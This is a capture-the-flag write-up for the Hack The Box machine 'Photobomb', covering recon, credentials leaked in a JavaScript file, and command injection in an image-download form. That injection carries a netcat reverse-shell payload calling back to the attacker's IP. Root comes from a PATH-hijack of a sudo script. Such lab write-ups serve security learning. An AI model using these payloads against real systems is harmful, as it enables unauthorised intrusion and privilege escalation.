---
title: "Photobomb Machine"
author: amandaguglieri
date: 2022-10-29T00:00:00Z
draft: false
TableOfContents: true
---


## About the machine

![Photobomb Machine Banner](img/photobomb.png)



| data |  |
|--------| ------- |
| Machine | Photobomb |
| Platform | Hackthebox |
| url | [link](https://app.hackthebox.com/machines/Photobomb) |
| creator | [slartibartfast](https://app.hackthebox.com/users/85231) |
| OS | Linux |
| Release data | 08 October 2022 |
| Difficulty | Easy |
| Points | 20 |
| ip | 10.10.11.182 |



### Recon

For the sake of commodity, we'll create a variable:

```bash
export ip=10.10.11.182
```

#### Service/ Port enumeration
Run nmap to enumerate open ports, services, OS, and traceroute

General enumeration not to make too much noise:
```sh
sudo nmap $ip -Pn
```
Results:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-20 12:34 EDT
Nmap scan report for 10.10.11.182
Host is up (0.095s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```
Once you know open ports, run nmap to see service versions and more details:   
```
sudo nmap -sCV -p22,80 $ip
```
Results:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
We open 10.10.11.182 in the browser. A redirection to http://photobomp.htb occurs, but the server is not found. So we add this routing in our /etc/hosts file:

We open the /etc/hosts file with an editor. For instance, nano.
```
sudo nano /etc/hosts
```
We move the cursor to the end and we add these lines:
```
10.10.11.182	photobomb.htb
```



#### Directory enumeration
We can use dirbuster to enumerate directories:
```
dirbuster
```
And we configure it to launch this dictionary: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt

Results:
```

Dirs found with a 200 response:

/

Dirs found with a 401 response:

/printer/
/printers/
/printerfriendly/
/printer_friendly/
/printer_icon/
/printer-icon/
/printer-friendly/
/printerFriendly/
/printersupplies/
/printer1/


--------------------------------
Files found during testing:

Files found with a 401 response:

/printer
/printer.php
/printers.php
/printerfriendly.php
/printer_friendly.php
/printer_icon.php
/printer-friendly.php
/printerFriendly.php
/printersupplies.php
/printer1.php

Files found with a 200 response:

/photobomb.js

```




As we wait, we do a dns enumeration:


#### DNS enumeration
Running:
```
nslookup
```
And after that:
```
> SERVER 10.10.11.182
```
Results:
```
Default server: 10.10.11.182
Address: 10.10.11.182#53
```
Then, we run:
```
> 10.10.11.182
```
And as a result, we have:
```
** server can't find 182.11.10.10.in-addr.arpa: NXDOMAIN
```
So there is no result.


### Exploiting the login page
At http://photobomb.htb/printer we find a login page. Use Burp to capture the request of a failed login using "username" as username and "password" as a password.
```
GET /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://photobomb.htb/
Upgrade-Insecure-Requests: 1
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
```
The authorization is the text "username:password" encoded in base64, which is known as Basic HTTP Authentication Scheme.

After trying to brute force the login page with different seclist dictionaries, we decided to have a look at the only file with response 200 in the directory enumeration: http://photobomb.htb/photobomb.js, and bingo! The user and password are there:
```
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```
We login into the web with:
+ user: pH0t0
+ password: b0Mb!


After entering user+pass a pannel to download images is displayed.
Capturing with BurpSuite this HTTP request to download an image we have:
```
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 78
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg&dimensions=3000x2000
```

Playing a little with this request in BurpSuite (module Repeater) we can infer that the site is using ruby as a programming language. Now we can play a little with the three parameters we have in the request (photo, filetype, and dimensions) and discover that for some reason filetype is injectable. We can add either a reverse shell in ruby or a reverse shell with netcat. Python doesn't work for us here. I go for an nc reverse shell and url-encode it like this:

```
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 164
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png;rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.80+24444+>/tmp/f&dimensions=3000x2000
```

Now, in the attacker machine (mine is 10.10.14.80), we listen on port 24444:
```
nc -lnvp 24444
```
Once we have the attacker machine listening, we go back to the repeater module in Burp Suite and launch the attack with the SEND button. We will obtain a reverse shell in the attacker machine.

After that, we run:
```
whoami
cat /home/wizard/user.txt
```
to get the user flag: ***********************

### Getting the system flag
We run some basic commands:
```
id
```
Results:
```
uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
```
```
echo $SHELL
```
Results:
```
/bin/bash
```
```
uname -a
```
Results:
```
Linux photobomb 5.4.0-126-generic #142-Ubuntu SMP Fri Aug 26 12:12:57 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```
```
sudo -l
```

Results:

```
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

Two interesting things here: 1. Our user can modify environmental variables, and 2. Our user can execute /opt/cleanup.sh as root with no need for a password.
Having a look at the /opt/cleanup.sh file, we can see the command "find" invoked with a relative path:

```
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```
Knowing that we can modify environmental variables, we are going to create a find file with execution permissions in our folder, and then we are going to add our folder in the first position of the $PATH environmental variable. With that we will execute /opt/cleanup.sh and escalate to root.

```
cd ~
echo bash > find
chmod +x find
sudo PATH=$PWD:$PATH /opt/cleanup.sh
```
Now, we are root:

```
id
```

Results:
```
uid=0(root) gid=0(root) groups=0(root)
```

And the flag:
```
cat root.txt
```
Results: *************************

